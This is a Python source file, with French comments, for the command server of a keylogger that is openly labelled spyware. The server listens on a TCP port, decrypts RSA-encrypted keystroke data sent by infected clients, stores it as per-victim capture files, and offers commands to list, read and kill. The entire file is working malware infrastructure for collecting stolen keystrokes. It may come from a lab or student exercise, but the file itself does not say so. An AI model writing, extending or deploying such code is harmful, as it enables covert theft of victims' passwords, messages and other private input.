from collections.abc import Callable, Iterable, Mapping
import socket
import datetime
import argparse
import time
import sys
import os
from pathlib import Path
import signal
from typing import Any
import psutil
import setproctitle
from threading import Thread
from functools import partial
import rsa

# Arguments 

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()
group.add_argument("-l", "--listen", type=int, help="listens on the TCP port entered by the user and waits for the spyware data.")
group.add_argument("-s", "--show", help="displays the list of files received by the program.", action="store_true")
group.add_argument("-r", "--readfile", type=str, help="displays the content of a keylog file.")
group.add_argument("-k", "--kill", help="stop all the instances of the server and stop all the clients.", action="store_true")
args = parser.parse_args()


#Variables

cwd = Path.cwd()
path_captures = cwd / "captures"


# Classes

class StoppableThread(Thread):
    def __init__(self, conn, addr, key):
        super(StoppableThread, self).__init__()
        self.running = True
        self.conn = conn
        self.addr = addr
        self.key = key
    
    def stop(self):
        self.running = False
    
    def run(self):

        return_code = ["OK"]


        while self.running:
            try:
        
                # Réception des données
                data = rsa.decrypt(self.conn.recv(1024), key).decode()

                if data == "":
                    print("client dead ?")
                    return_code[0] = "STOP"

                # si des données ont été réceptionnées
                if data:
                    handle_data(data, self.addr)

                    # renvoyer un code
                    if return_code[0] == "OK":
                        self.conn.send("OK".encode("utf-8"))


            except Exception as e:
                return_code[0] = "ERROR"
                print(f"Error Main : {e}")

            

        data = rsa.decrypt(self.conn.recv(1024), key).decode()

        # si des données ont été réceptionnées
        if data:
            handle_data(data, self.addr)

            print("send stop code")
            self.conn.send("STOP".encode("utf-8"))

            # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
            time.sleep(1)

        self.conn.close()




# Fonctions

def handle_data(data, addr):

    fic = list(path_captures.glob(f"{addr[0]}*.txt"))
    filename = path_captures / f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
    
    if fic == []:
        with open(filename, 'w') as file:
            file.write(data)
    else:
        ficfilename = fic[0]
        with open(ficfilename, 'w') as file:
            file.write(data)
        os.rename(ficfilename,filename)

    # print(f"Data received and saved")



def display_files():
    files = os.listdir(path_captures)
    print("List of files captured :")
    for file in files:
        print(" - " + file)
    
    if files == []:
        print("No files captured yet")



def read_file(filename):
    try:
        fic = list(path_captures.glob(f"*{filename}*"))

        if fic == []:
            print("File not found")

        elif len(fic) == 1 :
            with open (fic[0], "r") as file:
                print(f"File content ({fic[0].name}) :")
                content = file.read()
                print(content)

        elif len(fic) > 5 :
            print("Too many files found ! \nPlease be more specific")

        else:
            print("Several files found :")

            for i in range(len(fic)):
                print(f"{i} - {fic[i].name}")

            while True:
                print("Which one do you want to read ?")
                index = int(input("Enter the index of the file you want to read : "))

                if 0 <= index < len(fic):
                    with open(fic[index], "r") as file:
                        print(f"File content ({fic[index].name}) :")
                        content = file.read()
                        print(content)
                    break

                else:
                    print("Invalid index")
                    
    except Exception as e:
        print(f"Error: {e}")




# def handle_client(conn):

#     return_code = ["OK"]


#     while return_code[0] == "OK":
#         try:
    
#             # Réception des données
#             print("wait for data")
#             data = rsa.decrypt(conn.recv(1024), key).decode()

#             print(f"Data received : {data}")

#             if data == "":
#                 print("client dead ?")
#                 return_code[0] = "STOP"

#             # si des données ont été réceptionnées
#             if data:
#                 handle_data(data, addr)

#                 # renvoyer un code
#                 if return_code[0] == "OK":
#                     print("[+] Keep running")
#                     conn.send("OK".encode("utf-8"))


#         except Exception as e:
#             return_code[0] = "ERROR"
#             print(f"Error Main : {e}")

        

#     data = conn.recv(1024).decode('utf-8')

#     # si des données ont été réceptionnées
#     if data:
#         handle_data(data, addr)

#         print("send stop code")
#         conn.send("STOP".encode("utf-8"))

#         # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
#         time.sleep(1)

#     conn.close()




def get_server_instances():
    procs = []

    # itération sur tous les processus
    for proc in psutil.process_iter():
        if "SpywareServer" == proc.name():
            procs.append(proc.pid)

    return procs



def stop_server(signal=None, frame=None, threads=None, socket_server=None):

    if threads != None:
        for th in threads:
            th.stop()
    
    socket_server.close()

    print(f"stoping server. host : {host}")
    
    exit()



# Traitement

if args.listen:

    setproctitle.setproctitle("SpywareServer")
    
    # Configuration du socket
    host = '172.16.120.1'
    port = args.listen

    # création et configuration du socket
    socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_server.bind((host, port))
    socket_server.listen()

    print(f"Server listening on {host}:{port}")


    with open("rsa/private.pem", mode='rb') as f:
        key = rsa.PrivateKey.load_pkcs1(f.read())


    threads = []

    partial_stop_server = partial(stop_server, threads=threads, socket_server=socket_server)
    signal.signal(signal.SIGTERM, partial_stop_server)


    while True:
        try:
            # récupération de la connexion
            # print("wait for connection")
            conn, addr = socket_server.accept()

            print("[+] Connexion acceptée")
            print(conn)
            print(addr)

            th = StoppableThread(conn=conn, addr=addr, key=key)
            th.name = "SpywareThread"
            th.start()

            threads.append(th)
        

        # interception du KeyboardInterrupt
        except KeyboardInterrupt as e:
            answered = False
            
            while not answered:
                respons = input("[?] Voulez-vous vraiment arrêter le serveur ? (y/n) ")

                if respons == 'y' or respons == 'n':
                    answered = True

            if respons == 'n' or respons == 'N':
                # ne rien faire
                print("[+] Le serveur ne sera pas arrêté")


            else:
                # arrêter le serveur
                print("[+] Le serveur va s'arrêter")
                
                stop_server(threads=threads, socket_server=socket_server)


        except Exception as e:
            running = False
            print(f"Error Main : {e}")




elif args.show:
    display_files()
    sys.exit()



elif args.readfile:
    read_file(args.readfile)
    sys.exit()



elif args.kill:
    print("kill all the instances")
    
    procs = get_server_instances()

    print(f"{len(procs)} instances found")

    for proc in procs:
        try:
            os.kill(proc, signal.SIGTERM)

        except Exception as e:
            print(f"Error while killing servers : {e}")



